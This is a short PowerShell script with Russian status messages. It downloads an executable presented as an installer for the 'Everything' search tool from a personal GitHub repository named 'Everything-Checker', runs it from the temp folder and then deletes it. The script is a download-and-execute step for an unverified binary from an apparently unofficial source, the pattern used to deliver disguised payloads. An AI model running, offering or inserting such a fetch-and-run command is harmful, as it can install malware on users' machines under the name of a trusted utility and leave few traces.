$ErrorActionPreference = 'Stop'

$url  = 'https://github.com/xavier888lol-pixel/Everything-Checker/raw/main/Everything-1.4.1.1032.x64-Setup.exe'
$file = "$env:TEMP\Everything-Setup.exe"

Write-Host "Скачиваю..." -ForegroundColor Cyan
Invoke-WebRequest $url -OutFile $file

Write-Host "Запускаю установку..." -ForegroundColor Cyan
Start-Process $file -Wait

Remove-Item $file -ErrorAction SilentlyContinue
Write-Host "Готово!" -ForegroundColor Green
